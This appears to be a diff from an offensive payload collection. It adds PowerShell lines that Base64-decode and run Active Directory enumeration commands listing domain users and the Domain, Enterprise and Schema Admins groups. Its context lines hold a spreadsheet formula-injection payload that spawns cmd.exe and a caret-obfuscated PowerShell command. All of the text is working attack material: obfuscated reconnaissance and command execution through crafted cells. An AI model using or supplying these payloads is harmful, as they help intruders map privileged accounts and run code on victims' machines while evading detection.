@@ -1,3 +1,18 @@
+# Run net user /domain
+Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("bmV0IHVzZXIgL2RvbWFpbg==")))
+
+# Run net group /domain
+Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("bmV0IGdyb3VwIC9kb21haW4=")))
+
+# Run net group "Domain Admins" /domain
+Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("bmV0IGdyb3VwICJEb21haW4gQWRtaW5zIiAvZG9tYWlu")))
+
+# Run net group "Enterprise Admins" /domain
+Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("bmV0IGdyb3VwICJFbnRlcnByaXplIEFkbWlucyIgL2RvbWFpbg==")))
+
+# Run net group "Schema Admins" /domain
+Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("bmV0IGdyb3VwICJTY2hlbWEgQWRtaW5zIiAvZG9tYWlu")))
+
 =MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c REM.&&@p^o^w^e^r^s^h^e^l^l c:/*/*2/?al?.?x?"'!_xlbgnm.A1
 
 REM:let me mad:&@p^o^w^e^r^shell ^C^':'\\\\'/'\'*/'\'*'^2^/'\/////'^c^'*'^c^.?'^x^'?
